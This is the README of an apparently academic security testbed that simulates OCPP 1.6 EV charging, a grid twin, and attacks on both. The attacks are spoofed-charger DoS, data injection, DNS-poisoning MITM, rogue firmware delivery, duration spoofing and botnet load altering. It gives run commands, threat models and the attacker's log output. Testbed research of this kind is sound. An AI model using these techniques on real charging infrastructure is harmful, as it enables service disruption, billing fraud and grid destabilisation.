# EVSecSim — OCPP 1.6 Security Research Testbed

A proof-of-concept security research framework demonstrating known attack vectors against EV charging infrastructure over OCPP 1.6. Built for the SUTD thesis project on EV charging cybersecurity.

> **For authorized research and educational use only.**

---

## Overview

EVSecSim simulates a minimal EV charging ecosystem consisting of:

- A **CSMS** (Central System / Charge Point Management System) over WebSocket
- An **EVSE client** (EV Supply Equipment) backed by a live pandapower grid twin
- A **PGTwin grid simulator** (Dr. Biswas's 7-substation Singapore distribution network, 66 kV → 22 kV → 6.6 kV → 0.4 kV)
- Nine **attack scripts** demonstrating published OCPP 1.6 vulnerabilities across both internal and external threat models, including three attacks wired to the real PGTwin grid

The attacks target weaknesses documented by SaiFlow (2023) and Idaho National Laboratory (INL/CON-23-72329, 2023): no transport encryption, no message authentication, no connection deduplication, no charge-point identity verification, and no firmware signature verification.

---

## Project Structure

```
SUTDEVsec/
├── Dockerfile                      # Shared image for all services
├── docker-compose.yml              # Full containerised topology
├── capture_attacks.ps1             # Automated pcap capture for all profiles
├── .dockerignore
├── requirements.txt
├── core/
│   ├── csms_server4.py             # OCPP 1.6 CSMS (WebSocket server on port 9000)
│   └── evse_client4_fixed.py       # Legitimate EVSE client + pandapower grid simulation
├── grid/
│   └── ZSGplussync_docker.py       # PGTwin: 7-substation Singapore grid (Dr. Biswas)
├── attacks/                        # ── OCPP 1.6 track (Attacks 1–9) ──
│   ├── run_attacks.py                  # Interactive orchestrator (local use)
│   ├── attack_saiflow_dos_patched.py   # Attack 1:  SaiFlow duplicate-CP DoS
│   ├── attack_fdi.py                   # Attack 2:  MeterValues False Data Injection
│   ├── attack_mitm_session_patched.py  # Attack 3a: MITM proxy — internal (operator-net)
│   ├── attack_mitm_ext.py              # Attack 3b: MITM proxy — external (public-net)
│   ├── dns_poison.py                   # Attack 3b-DNS: DNS-redirect interception primitive
│   ├── attack_load_altering.py         # Attack 4:  Coordinated botnet load altering
│   ├── attack_firmware.py              # Attack 5:  Malicious firmware update / RCE
│   ├── attack_duration_spoof.py        # Attack 6:  Duration spoofing (StopTransaction drop)
│   ├── attack_overload_grid.py         # Attack 7:  Single EVSE grid overload + PGTwin intro
│   ├── attack_load_grid.py             # Attack 8:  Coordinated load altering + PGTwin grid
│   ├── attack_spoof_grid.py            # Attack 9:  Duration spoofing + PGTwin grid
│   ├── grid_ramp_analysis.py           # Attack 10: Coordinated fleet overload — ramp-to-failure (LV vs MV)
│   └── a6breakers.py                   # Grid topology visualiser (Plotly HTML)
└── v201/                           # ── OCPP 2.0.1 tracks ──
    ├── core/                           # SURVIVAL track (plaintext / Profile-1, port 9100)
    │   ├── csms_server_v201.py         # OCPP 2.0.1 CSMS (plaintext)
    │   └── evse_client_v201.py         # Legitimate 2.0.1 EVSE (baseline)
    ├── attacks/                        # attacks that SURVIVE 2.0.1
    │   ├── attack_fdi_v201.py          # 2.0.1 False Data Injection (survives)
    │   └── attack_overload_v201.py     # 2.0.1 Single EVSE overload + PGTwin grid
    └── secure/                         # PREVENTION track (Profile 3 mutual-TLS, port 9101)
        ├── gen_certs.py                # PKI: CA, server/client certs, firmware-signing key
        ├── csms_secure_v201.py         # wss:// mutual-TLS CSMS
        ├── evse_secure_v201.py         # TLS EVSE + firmware signature verification
        └── attacks/
            ├── attack_mitm_secure.py       # MITM (3a/3b/6) blocked by TLS
            └── attack_firmware_secure.py   # firmware RCE (5) blocked by signed firmware
```

---

## Core Components

### CSMS — `core/csms_server4.py`

A minimal OCPP 1.6 Central System Management Server that intentionally omits all security controls present in production deployments. It exists to be a realistic target: it behaves like a real CSMS but leaves every documented OCPP 1.6 vulnerability exposed.

**What it does:**
- Listens for WebSocket connections on `ws://0.0.0.0:9000`
- Reads the first raw text frame as the Charge Point identity (no credential check)
- Spawns an independent asyncio task per connection — there is **no CP registry**, so duplicate CP IDs create two live sessions simultaneously (the SaiFlow vulnerability)
- Accepts every `BootNotification` unconditionally (`RegistrationStatus.accepted`)
- Issues auto-incrementing `transactionId` values starting at 1 (shared global counter across all CPs)
- Logs `MeterValues` power readings to stdout — no plausibility check, no signature verification
- Logs `StopTransaction` with billing summary — no integrity check on the reported `meterStop`
- Handles `FirmwareStatusNotification` — logs progress, no verification of the firmware source

**Default settings:**

| Parameter | Value | Set via |
|-----------|-------|---------|
| Bind address | `0.0.0.0` | `BIND_HOST` env var |
| Port | `9000` | hardcoded |
| Heartbeat interval returned to EVSE | `10 s` | hardcoded |
| Registration policy | accept all | hardcoded |
| Duplicate CP handling | both sessions kept alive | no dedup logic |
| Message authentication | none | OCPP 1.6 has none |

**OCPP messages handled:** `BootNotification`, `Heartbeat`, `StartTransaction`, `MeterValues`, `StopTransaction`, `FirmwareStatusNotification`

---

### EVSE — `core/evse_client4_fixed.py`

A legitimate EV charging station simulator backed by a live pandapower grid twin. It models realistic load behaviour across 5 EV connectors and is the "victim" that attack scripts target or impersonate.

**What it does:**

*Default mode (pandapower simulation):*
- Connects to the CSMS as CP `CP_1`
- Sends `BootNotification` (vendor: `Vendor`, model: `Model1`)
- Builds a local pandapower grid twin: 6.6 kV → 0.4 kV, 1 MVA transformer, 5 load buses at 60 kW rated each
- Every second, each load is randomly toggled on or off (50 % probability)
- Every 5 seconds, runs a DC power flow (`pp.runpp`) and reports each active load's real power as a `MeterValues` frame (measurand: `Power.Active.Import`, unit: `kW`)
- Suppresses readings below 0.5 kW to reduce noise
- Simulation runs for **300 seconds** then the process exits

*Timed session mode (`--session-duration N`):*
- Skips pandapower — sends a single `StartTransaction` (id\_tag: `EV-CARD-001`, `meterStart=0`)
- Sends `MeterValues` every **5 seconds** at a fixed **60 kW** with a cumulative energy register (Wh)
- After N seconds, sends `StopTransaction` with the final energy reading and exits cleanly
- Used by the duration-spoof attack so the proxy has a real `StopTransaction` to intercept

**Default settings:**

| Parameter | Value | Set via |
|-----------|-------|---------|
| CP identity | `CP_1` | hardcoded |
| CSMS URL | `ws://127.0.0.1:9000` | `--url` |
| Simulation duration | `300 s` | hardcoded |
| Power flow interval | every `5 s` | hardcoded |
| Load per connector (rated) | `60 kW` | pandapower model |
| Connectors | `5` | pandapower model |
| MeterValues measurand | `Power.Active.Import` | hardcoded |
| Timed session power | `60 kW` (fixed) | hardcoded |
| Timed session MeterValues interval | `5 s` | hardcoded |
| Timed session id\_tag | `EV-CARD-001` | hardcoded |
| Session duration (timed mode) | no default — required | `--session-duration` |

**OCPP messages sent:** `BootNotification`, `MeterValues`, `StartTransaction` (timed mode), `StopTransaction` (timed mode), `FirmwareStatusNotification` (when firmware update received)

---

### PGTwin Grid Simulator — `grid/ZSGplussync_docker.py`

Dr. Biswas's 7-substation Singapore distribution grid simulator, adapted for Docker/headless operation. It runs a continuous pandapower power-flow loop and exposes a file-based interface so attack containers can inject EV load without any network coupling — a shared Docker volume is the only bridge.

**Grid topology:**

```
PGTwin — Singapore 7-Substation Distribution Network (48 buses)
================================================================

  66 kV  TRANSMISSION
  ----------------------------------------------------------------
  [G] 1.3607 MW (slack)
   |
  B0 --QG1-- B1 --+--QT1-1-- B2 --15km-- B5 --QT1-2-- B7
                   +--QT2-1-- B4 --15km-- B6 --QT2-2-- B8
                                          |             |
                                    [T1] 100 MVA  [T2] 100 MVA
                                    66 / 22 kV    66 / 22 kV

  22 kV  PRIMARY DISTRIBUTION
  ----------------------------------------------------------------
  B9  --QT1-3-- B11 --10km-- B13 --QT1-4-- B15
  B10 --QT2-3-- B12 --10km-- B14 --QT2-4-- B16
                                    |               |
                              [T3] 50 MVA    [T4] 50 MVA
                              22 / 6.6 kV    22 / 6.6 kV

  6.6 kV  SECONDARY DISTRIBUTION
  ----------------------------------------------------------------
  B17 --QT1-5-- B19 --+--QD1-1-- B21   Load1  1.0 MW  Industrial  DS2
                       +--QT1-6-- B23 --5km-- B27 --QT1-7-- B29
  B18 --QT2-5-- B20 --QT2-6-- B25 --5km-- B26 --QT2-7-- B28
                                                    |           |
                                             [T6] 25 MVA  [T5] 25 MVA
                                             6.6 / 0.4 kV 6.6 / 0.4 kV

  0.4 kV  LOW VOLTAGE  (DS3 / DS4)
  ----------------------------------------------------------------
  B31 --QT1-8-- B33 --QT1-9-- B35 --0.5km-- B41 --+--QD1-2-- B46  Load6  50 kW  Res  DS4
                                                    +--QD1-3-- B47  Load7  30 kW  Res  DS4

  B30 --QT2-8-- B32 --+--QT2-9-- B36 --0.5km-- B39 --+--QD2-1-- B42  Load2  50 kW  Res  DS3
                       |                               +--QD2-2-- B43  Load3  30 kW  Res  DS3
                       +--QT2-10-- B37 --0.5km-- B40 --+--QD2-3-- B44  Load4 100 kW  SmInd DS4  <-- EV
                                                        +--QD2-4-- B45  Load5  30 kW  Res  DS4

  ----------------------------------------------------------------
  N/O tie switches (ring flexibility, normally open):
    QT1-10: B19 <-> B24    QT2-11: B20 <-> B22
    QT2-12: B32 <-> B34    QT1-11: B33 <-> B38
  ================================================================
  EV injection point:  Bus 44  (Load4, DS4, 0.4 kV, small industry)
    Baseline vm_pu = 0.9689  (387.6 V)   total load = 1290 kW
    At +66 kW EV:  vm_pu = 0.9515  (380.6 V)   total load = 1356 kW
```

**What it does:**

- Builds a 48-bus Singapore-style distribution network spanning four voltage tiers: 66 kV (transmission), 22 kV (primary distribution), 6.6 kV (secondary distribution), and 0.4 kV (low-voltage end-users)
- Instantiates 7 named loads mapped to real Singapore substations: Kampong Java, Tampines, Paya Lebar, Ayer Rajah, Jurong Pier, and Choa Chu Kang
- Before every `runpp()` call, reads `/shared/ev_load_kw.txt` from the shared Docker volume and adds that value on top of **Load4's baseline** at Bus 44 (DS4, 0.4 kV small industry feeder, 100 kW nominal)
- Runs `pandapower.runpp()` in a tight loop and writes power-flow results to four CSV files on the shared volume at every iteration
- Prints real-time state to stdout: iteration number, EV kW injected, Bus 44 vm_pu, and total network load

**Grid topology:**

| Layer | Buses | Voltage | Key elements |
|-------|-------|---------|-------------|
| Transmission | Bus 0–8 | 66 kV | 1 slack generator (1.3607 MW), inter-substation lines |
| Primary distribution | Bus 9–16 | 22 kV | 2 × 100 MVA transformers (66/22 kV) |
| Secondary distribution | Bus 17–29 | 6.6 kV | 2 × 50 MVA transformers (22/6.6 kV) |
| Low-voltage | Bus 30–47 | 0.4 kV | 2 × 25 MVA transformers (6.6/0.4 kV), 7 load buses |

11 distribution lines · 32 circuit breakers/switches (some N/O for ring flexibility) · baseline total load 1.29 MW · generator headroom ~70.7 kW before Load4 injection.

**EV injection point — Load4, Bus 44 (DS4, 0.4 kV):**

| EV load | Bus 44 vm_pu | Total load | Δ from baseline |
|---------|-------------|------------|----------------|
| 0 kW (baseline) | 0.9689 pu | 1290 kW | — |
| 11 kW | 0.9662 pu | 1301 kW | −0.0027 pu |
| 22 kW | 0.9633 pu | 1312 kW | −0.0056 pu |
| 44 kW | 0.9575 pu | 1334 kW | −0.0114 pu |
| 55 kW (5 bots × 11) | 0.9546 pu | 1345 kW | −0.0143 pu |
| 66 kW | 0.9515 pu | 1356 kW | −0.0174 pu |

All steps stay within the 70.7 kW headroom, so `runpp()` always converges.

**CSV outputs (written to `/shared` on the Docker volume at every iteration):**

| File | Key columns |
|------|-------------|
| `SimOutputBus.csv` | `vm_pu45` = Bus 44 voltage — the primary attack evidence metric |
| `SimOutputLine.csv` | `loading_percent40` = feeder line to Load4 |
| `SimOutputPower.csv` | Per-line active/reactive power flows |
| `SimOutputBreaker.csv` | Circuit breaker open/closed state per iteration |

**Docker adaptations from Dr. Biswas's original `ZSGplussync.py`:**

| Change | Reason |
|--------|--------|
| `matplotlib.use('Agg')` + GUI calls removed | Headless containers have no display |
| `mqtt_publish_voltages()` → no-op | `mosquitto_pub` not installed in image |
| `read_ev_load_kw()` added | Reads `/shared/ev_load_kw.txt` before each `runpp()` |
| EV load injected as `net.load.at[3,'p_mw'] += ev_kw/1000` | Couples OCPP layer to physical grid model |

**Default settings:**

| Parameter | Value | Set via |
|-----------|-------|---------|
| EV load file | `/shared/ev_load_kw.txt` | hardcoded |
| EV injection bus | Bus 44 (Load4, DS4, 0.4 kV) | `EV_LOAD_IDX = 3` |
| Load4 baseline | 0.1 MW | `EV_LOAD_BASELINE_MW` |
| CSV output directory | `/shared` | `CSV_DIR` env var |
| Loop | continuous, no sleep | while True |

---

## Containerised Network Topology

Each component runs in its own container on a logically separate network segment. The CSMS is dual-homed. External attackers on `public-net` can only reach `172.20.0.10:9000` and have zero visibility into `operator-net`.

```
  ┌──────────────────────────────────────────────────────────────────────────────┐
  │                        public-net  ·  172.20.0.0/24                           │
  │                                                                                │
  │  ┌──────────────┐   ┌──────────────┐   ┌──────────────┐   ┌──────────────┐  │
  │  │  atk-saiflow  │   │   atk-load   │   │ atk-mitm-ext │   │evse-via-mitm │  │
  │  │ 172.20.0.30   │   │ 172.20.0.40  │   │ 172.20.0.30  │   │  -ext        │  │
  │  │ (Attack 1)    │   │ (Attack 4)   │   │ (Attack 3b)  │   │ 172.20.0.50  │  │
  │  └──────┬────────┘   └──────┬───────┘   └──────┬───────┘   └──────┬───────┘  │
  │         │                   │                   │  proxy :9002     │           │
  │         └─────────┬─────────┘       ws://csms:9000  ◄─────────────┘           │
  │                   │ ws://csms:9000               │                             │
  │                   ▼                              ▼                             │
  │          ┌─────────────────────────────────────────┐                          │
  │          │              csms  172.20.0.10            │ ◄── :9000 → host       │
  │          └─────────────────────┬───────────────────┘                          │
  └────────────────────────────────│──────────────────────────────────────────────┘
                                   │ dual-homed
  ┌────────────────────────────────│──────────────────────────────────────────────┐
  │               operator-net  ·  172.19.0.0/24  [internal · isolated]            │
  │                                   │                                             │
  │                       ┌───────────┴──────────┐                                 │
  │                       │    csms  172.19.0.10  │                                 │
  │                       └──┬────┬────┬──────────┘                                │
  │                          │    │    │    │                                       │
  │         ┌────────────────┘    │    │    └──────────────┐                       │
  │         ▼                     ▼    ▼                   ▼                       │
  │  ┌─────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────────┐   │
  │  │    evse      │  │ evse-via-fdi │  │   atk-mitm   │  │   atk-firmware   │   │
  │  │ 172.19.0.20  │  │ 172.19.0.30  │  │ 172.19.0.40  │  │  172.19.0.30    │   │
  │  │ (legit EVSE) │  │(compromised) │  │ proxy :9001  │  │ rogue CSMS :9000 │   │
  │  └─────────────┘  └──────────────┘  └──────┬───────┘  │ payload HTTP:8080│   │
  │                                              │          └────────┬─────────┘   │
  │                                ws://atk-mitm:9001               │             │
  │                                              ▼                   ▼             │
  │                                 ┌──────────────────┐  ┌──────────────────┐    │
  │                                 │  evse-via-mitm   │  │ evse-via-firmware│    │
  │                                 │  172.19.0.50     │  │  172.19.0.60     │    │
  │                                 └──────────────────┘  └──────────────────┘    │
  │                                                                                │
  │  ┌──────────────────────────┐                                                  │
  │  │  atk-duration-spoof      │  proxy :9003  ←── evse-via-duration-spoof       │
  │  │  172.19.0.41  (Attack 6) │  drops StopTransaction, injects phantom load    │
  │  │  evse-via-duration-spoof │                                                  │
  │  │  172.19.0.61             │                                                  │
  │  └──────────────────────────┘                                                  │
  └────────────────────────────────────────────────────────────────────────────────┘
```

### External MITM via DNS redirection (Attack 3b-DNS)

The rigorous external-MITM variant adds a **poisoned DNS resolver** so the EVSE is redirected by *name resolution*, not by its own configuration. The EVSE dials the real hostname `csms.cpo.sg` in **both** the attack and benign runs — only the DNS answer differs. This supplies the interception primitive the plain `mitm-ext` profile assumed.

```
  public-net · 172.20.0.0/24
                                    (1) "csms.cpo.sg ?"
   ┌────────────────────┐   DNS query ───────────────►   ┌──────────────────────┐
   │   evse-via-dns      │                                 │     dns-poison        │
   │   172.20.0.55       │                                 │     172.20.0.5        │
   │  --url ws://        │  ◄───── (2) "A 172.20.0.33" ─── │     MODE = POISON     │
   │  csms.cpo.sg:9000   │          FORGED answer          │  (attacker's IP for   │
   └─────────┬───────────┘                                 │   csms.cpo.sg)        │
             │                                             └──────────────────────┘
             │ (3) WebSocket → 172.20.0.33:9000
             │     EVSE believes host = csms.cpo.sg
             ▼
   ┌─────────────────────────┐  (4) relay + tamper   ┌───────────────────────────┐
   │   atk-mitm-ext-dns       │  ws://csms:9000 ────► │   csms  172.20.0.10        │
   │   172.20.0.33  :9000     │                       │   records 999 kW (tampered)│
   │   MITM proxy             │                       └───────────────────────────┘
   └─────────────────────────┘

  Benign control (profile mitm-ext-dns-safe): identical EVSE command, but
  dns-honest (172.20.0.6) answers "A 172.20.0.10" → the EVSE reaches the real
  CSMS directly and it records the untampered 60 kW. Only the DNS answer changed.
```

### PGTwin grid integration (Attacks 7, 8, 9, 10)

Attacks 7–10 add a second layer to the topology: a shared Docker volume bridges the OCPP protocol containers to the pandapower grid simulator. The attack container writes a single float (aggregate kW) to the volume; pgtwin reads it before every `runpp()` call. The **injection point is configurable** (`EV_LOAD_IDX`): Attacks 7–9 target the 0.4 kV small-industry bus (LV worst case); Attack 10's `pgtwin-mv` targets the 6.6 kV MV hub (realistic).

```
  +---------------------------------------------------------------------------+
  |              pgtwin-shared  *  Docker named volume                         |
  |  /shared/ev_load_kw.txt      <- aggregate EV kW, written by attack         |
  |  /shared/SimOutputBus.csv    <- vm_pu  = injection-bus voltage (evidence)  |
  |  /shared/SimOutputLine.csv   <- loading_percent = feeder loading (evidence)|
  +==================================+========================================+
             | reads before runpp()  |  reads before runpp()
             v                       v
  +------------------------------+   +------------------------------------+
  |  pgtwin  172.19.0.70         |   |  pgtwin-mv  172.19.0.71            |
  |  EV inject: Load4 / Bus 44   |   |  EV inject: Load1 / Bus 21         |
  |  0.4 kV "small industry"     |   |  6.6 kV MV charging hub            |
  |  (Attacks 7,8,9 — LV worst)  |   |  (Attack 10 — realistic)           |
  |  baseline vm_pu = 0.9689     |   |  fails by THERMAL OVERLOAD ~5.5 MW |
  +------------------------------+   +------------------------------------+

 writes ^         writes ^         writes ^               writes ^
        |                |                |                      |
 +------+------+  +------+------+  +------+--------+  +----------+----------+
 | atk-overload|  | atk-load-   |  | atk-spoof-    |  | atk-overload-fleet  |
 | -grid       |  | grid        |  | grid          |  | 172.20.0.43         |
 | 172.20.0.42 |  | 172.20.0.41 |  | 172.19.0.42   |  | public-net          |
 | public-net  |  | public-net  |  | proxy :9004   |  | 20 x 300 kW DC-fast |
 | single rogue|  | 5-bot botnet|  | drops StopTxn |  | = 6 MW fleet        |
 | EVSE        |  | surge/drop/ |  | holds phantom |  | -> feeder >100%     |
 | 0->300 kW   |  | oscillate   |  | (+evse-via-   |  | (overcurrent trip)  |
 | (Attack 7)  |  | (Attack 8)  |  |  spoof-grid)  |  | (Attack 10)         |
 +-------------+  +-------------+  | (Attack 9)    |  +---------------------+
                                   +---------------+
```

### Threat model per attack

| # | Attack | Attacker position | Network | Operator-net visible? | Initial access vector |
|---|--------|-------------------|---------|----------------------|----------------------|
| 1 | SaiFlow DoS | External | public-net | No | Direct WebSocket to exposed CSMS port |
| 2 | False Data Injection | Compromised EVSE (insider) | operator-net | Yes | Supply chain / physical compromise |
| 3a | MITM — Internal | Compromised network device | operator-net | Yes | ARP poisoning / rogue switch |
| 3b | MITM — External | External attacker | public-net | No | BGP hijack / DNS poisoning / rogue cloud proxy |
| 3b-DNS | MITM — External (DNS-redirect) | External attacker | public-net | No | Attacker-controlled DNS (rogue 4G DNS / gateway / DoT downgrade) — interception primitive implemented |
| 4 | Load Altering | External botnet | public-net | No | Direct WebSocket to exposed CSMS port |
| 5 | Malicious Firmware Update | Rogue / compromised CSMS | operator-net | Yes | DNS poisoning / compromised CSMS platform |
| 6 | Duration Spoofing | MITM on operator LAN | operator-net | Yes | ARP poisoning / rogue switch |
| 7 | Single EVSE Grid Overload + PGTwin | Single rogue EVSE | public-net | No | Direct WebSocket to exposed CSMS port |
| 8 | Load Altering + PGTwin | External botnet | public-net | No | Direct WebSocket to exposed CSMS port |
| 9 | Duration Spoofing + PGTwin | MITM on operator LAN | operator-net | Yes | ARP poisoning / rogue switch |

---

## Docker Deployment

### Prerequisites

- Docker Desktop (or Docker Engine + Compose plugin)

### Run scenarios

```bash
# Baseline — CSMS + legitimate EVSE (no attack)
docker compose --profile normal up --build

# Attack 1 — SaiFlow DoS  (external attacker + victim EVSE)
docker compose --profile saiflow up --build

# Attack 2 — False Data Injection  (compromised EVSE)
docker compose --profile fdi up --build

# Attack 3a — MITM proxy, INTERNAL  (operator-net, ARP poisoning threat model)
docker compose --profile mitm up --build

# Attack 3b — MITM proxy, EXTERNAL  (public-net, BGP/DNS hijack threat model)
docker compose --profile mitm-ext up --build

# Attack 3b-DNS — EXTERNAL MITM via poisoned DNS  (real interception primitive)
docker compose --profile mitm-ext-dns up --build --force-recreate
docker compose --profile mitm-ext-dns-safe up --build --force-recreate   # benign control

# Attack 4 — Coordinated load altering  (external botnet, 10 bots)
docker compose --profile load up --build

# Attack 5 — Malicious firmware update  (rogue CSMS, no real CSMS started)
docker compose --profile firmware up --build

# Attack 6 — Duration spoofing  (StopTransaction drop, phantom load)
docker compose --profile duration-spoof up --build

# Attack 7 — Single EVSE grid overload + PGTwin intro  (step-wise Bus 44 voltage sag)
docker compose --profile overload-grid up --build --force-recreate

# Attack 8 — Coordinated load altering + PGTwin real grid  (external botnet → Bus 44 voltage sag)
docker compose --profile load-grid up --build --force-recreate

# Attack 9 — Duration spoofing + PGTwin real grid  (ghost session holds Bus 44 depressed 60 s)
docker compose --profile spoof-grid up --build --force-recreate

# Attack 10 — Coordinated fleet overload at realistic MV hub  (20x300 kW = 6 MW, feeder >100%)
docker compose --profile overload-fleet up --build --force-recreate
python attacks/grid_ramp_analysis.py     # LV-vs-MV ramp-to-failure thresholds + figure (local)
```

Drop `--build` on repeat runs if no code has changed.

> **Note for Attacks 7, 8 and 9:** Always use `--force-recreate` (or run `docker compose --profile <X> down` first). Docker Compose reuses running containers across sessions; without recreating, the `pgtwin` container may start without its shared volume mount and the OCPP→grid coupling will not work. For Attack 9, do **not** use `--abort-on-container-exit` — the EVSE container exits by design after receiving the forged `StopTransaction` ACK, and the ghost phase must continue for a further 60 seconds after that.

### Follow logs

```bash
# All containers in a scenario
docker compose --profile fdi logs -f

# Individual containers
docker logs -f csms
docker logs -f evse-via-fdi
docker logs -f atk-mitm
docker logs -f atk-mitm-ext
docker logs -f atk-firmware
docker logs -f evse-via-firmware
docker logs -f atk-duration-spoof
docker logs -f evse-via-duration-spoof

# Attack 7 containers
docker logs -f atk-overload-grid
docker logs -f pgtwin

# Attack 8 containers
docker logs -f atk-load-grid
docker logs -f pgtwin

# Attack 9 containers
docker logs -f atk-spoof-grid
docker logs -f evse-via-spoof-grid
docker logs -f pgtwin
```

### Tear down

```bash
docker compose --profile <profile> down --remove-orphans
```

### Observing grid impact (Attacks 7, 8, 9)

Grid attacks produce evidence at three levels: real-time container stdout, persistent CSV files on the shared Docker volume, and the live coupling file itself.

#### Real-time: pgtwin stdout

The most immediate view. Every `runpp()` iteration emits one line:

```
[PGTwin] iter=1330 | EV=  300.0 kW | Load4(Bus44) vm_pu=0.8694 | total_load=1590 kW
```

Watch it live while an attack profile is running:

```bash
docker logs -f pgtwin
```

You see vm_pu change in real time as each attack phase fires — stepping down across overload steps (Attack 7), surging and recovering during botnet phases (Attack 8), or holding depressed for 60 s after the EVSE exits (Attack 9).

#### Grid CSV files (shared volume)

pgtwin writes four CSV files to `/shared` at every iteration. These persist the full run history and are the primary thesis evidence artefacts.

**Extract the files:**

```bash
# Copy to current directory while containers are running (or after)
docker cp pgtwin:/shared/SimOutputBus.csv  .
docker cp pgtwin:/shared/SimOutputLine.csv .

# Or tail directly without copying
docker exec pgtwin tail -20 /shared/SimOutputBus.csv
```

**Key columns:**

| File | Column | What it shows |
|------|--------|---------------|
| `SimOutputBus.csv` | `vm_pu45` | Bus 44 voltage in pu — primary impact metric |
| `SimOutputLine.csv` | `loading_percent40` | Feeder line loading to Load4 (%) |
| `SimOutputPower.csv` | `p_from_mw40` | Active power on Load4 feeder (MW) |
| `SimOutputBreaker.csv` | all | Circuit breaker open/closed state |

> **Column naming:** buses and lines are 1-indexed in the CSV header. `vm_pu45` corresponds to pandapower Bus index 44 (Bus 44, DS4, 0.4 kV).

**Quick Python analysis:**

```python
import pandas as pd

bus  = pd.read_csv("SimOutputBus.csv")
line = pd.read_csv("SimOutputLine.csv")

# Voltage range at Bus 44 across the full run
print(bus["vm_pu45"].describe())

# Plot voltage timeline
bus["vm_pu45"].plot(title="Bus 44 vm_pu — EV injection point")

# Feeder loading
print(line["loading_percent40"].describe())
```

#### Live coupling file

`/shared/ev_load_kw.txt` contains the float currently being injected into the grid model. Poll it during a run to watch phase transitions in real time:

```bash
watch -n1 "docker exec pgtwin cat /shared/ev_load_kw.txt"
```

For Attack 9, this file holds a non-zero value for 60 s **after** `evse-via-spoof-grid exited with code 0` appears in compose logs — that persistent non-zero is the phantom grid load the CSMS cannot detect from OCPP alone.

#### Attack-specific evidence summary

| Attack | Watch for in `pgtwin` logs | Key CSV evidence |
|--------|---------------------------|-----------------|
| **7 — Single EVSE overload** | Staircase: `vm_pu` drops at each 20 s mark | `vm_pu45`: 0.9689 → 0.9418 → 0.9093 → 0.8694, then recovery to 0.9689 |
| **8 — Botnet load altering** | `vm_pu` jumps between 0.9546 (surge) and 0.9689 (drop) every 30 s | Oscillate phase shows alternating rows at both values every 5 s |
| **9 — Duration spoofing** | `vm_pu=0.9662` persists after `evse-via-spoof-grid exited with code 0` | 60-row gap at vm_pu=0.9662 after physical disconnect; recovery only when `ev_load_kw.txt ← 0.0` |

### Automated pcap capture

`capture_attacks.ps1` automates the full capture workflow for each profile: builds containers, waits for initialisation, runs `tcpdump` inside the capture container for the configured window, extracts the pcap, and tears down.

```powershell
# Capture all profiles in sequence (~9 min total)
.\capture_attacks.ps1

# Capture one profile
.\capture_attacks.ps1 -Profile saiflow
.\capture_attacks.ps1 -Profile duration-spoof
```

Output files are written to `captures\attack_<label>.pcap`. Open in Wireshark and right-click any TCP stream on port 9000 → **Decode As → WebSocket** to view OCPP JSON payloads.

### Wireshark filters by attack

| Attack | Capture container | Filter |
|--------|------------------|--------|
| Normal baseline | `csms` | `websocket` |
| FDI | `csms` | `websocket && ip.dst == 172.19.0.10` |
| MITM internal | `csms` | `websocket && (tcp.port == 9000 or tcp.port == 9001)` |
| MITM external | `csms` | `websocket && (tcp.port == 9000 or tcp.port == 9002)` |
| SaiFlow / Load | `csms` | `websocket && ip.dst == 172.20.0.10` |
| Firmware | `atk-firmware` | `websocket \|\| http` |
| Duration spoofing | `atk-duration-spoof` | `websocket && (tcp.port == 9000 or tcp.port == 9003)` |
| EVSE grid overload + PGTwin | `atk-overload-grid` | `websocket && ip.dst == 172.20.0.10` |
| Load altering + PGTwin | `atk-load-grid` | `websocket && ip.dst == 172.20.0.10` |
| Duration spoofing + PGTwin | `atk-spoof-grid` | `websocket && (tcp.port == 9000 or tcp.port == 9004)` |

For Attack 5 also inspect the HTTP payload delivery (port 8080 is published to host):

```bash
curl http://localhost:8080/firmware.sh
```

For Attack 6 the key evidence spans two ports: StopTransaction on port 9003 (EVSE→proxy, **absent on port 9000**), then phantom MeterValues on port 9000 only after port 9003 goes silent.

---

## Local Quick Start (no Docker)

### Requirements

```
ocpp==2.1.0
websockets==16.0
pandapower==3.4.0
numpy==2.2.0
matplotlib==3.10.0
plotly==6.7.0
```

```bash
pip install -r requirements.txt
```

### Run components manually

```bash
# Terminal 1 — CSMS
python core/csms_server4.py

# Terminal 2 — Legitimate EVSE (300s pandapower simulation)
python core/evse_client4_fixed.py

# Terminal 2 — Timed charging session (for duration-spoof testing)
python core/evse_client4_fixed.py --session-duration 20

# Terminal 2 — EVSE via internal MITM proxy (port 9001)
python core/evse_client4_fixed.py --url ws://127.0.0.1:9001

# Terminal 2 — EVSE via external MITM proxy (port 9002)
python core/evse_client4_fixed.py --url ws://127.0.0.1:9002

# Terminal 2 — EVSE via duration-spoof proxy (port 9003)
python core/evse_client4_fixed.py --url ws://127.0.0.1:9003 --session-duration 20

# Attack 5 — rogue CSMS replaces the real one; EVSE connects to it
# Terminal 1 (rogue CSMS + HTTP payload server):
python attacks/attack_firmware.py
# Terminal 2 (EVSE — points at rogue CSMS, NOT the real one):
python core/evse_client4_fixed.py --url ws://127.0.0.1:9000

# Attack 6 — duration spoof proxy (run alongside real CSMS)
# Terminal 1: python core/csms_server4.py
# Terminal 2: python attacks/attack_duration_spoof.py
# Terminal 3: python core/evse_client4_fixed.py --url ws://127.0.0.1:9003 --session-duration 20
```

---

## Attacks

### Attack 1 — SaiFlow Denial-of-Service

**Script:** `attacks/attack_saiflow_dos_patched.py`  
**Profile:** `saiflow`  
**Network:** public-net (external attacker)

Exploits OCPP 1.6's lack of duplicate-connection detection. A rogue client connects with the same CP ID (`CP_1`) as a legitimate EVSE. The CSMS accepts the second connection without deduplication, creating session shadowing: operator commands are routed to the attacker's socket, not the real charger. A Heartbeat flood (~1000 HB/s) then saturates the CSMS event loop.

```bash
python attacks/attack_saiflow_dos_patched.py
python attacks/attack_saiflow_dos_patched.py --cp-id CP_2 --duration 30
python attacks/attack_saiflow_dos_patched.py --interval 0.1
```

**Expected output — attack terminal:**
```
============================================================
  EVSecSim — SaiFlow DoS Attack
============================================================
  Target CSMS   : ws://127.0.0.1:9000
  Spoofed CP ID : CP_1
  Flood interval: 1.0 ms  (1000 HB/s)
  Duration      : unlimited
============================================================

[ATK 14:02:31.415] Phase 1 — Opening rogue WebSocket to ws://127.0.0.1:9000
[ATK 14:02:31.423] Phase 1 — Sending raw CP ID: 'CP_1'
[OK  14:02:31.431] Phase 1 — CSMS accepted connection for 'CP_1'
[ATK 14:02:31.447] Sending rogue BootNotification as 'CP_1'
[ATK 14:02:31.447]   Vendor : RogueVendor
[ATK 14:02:31.447]   Model  : RogueCP-v1.0
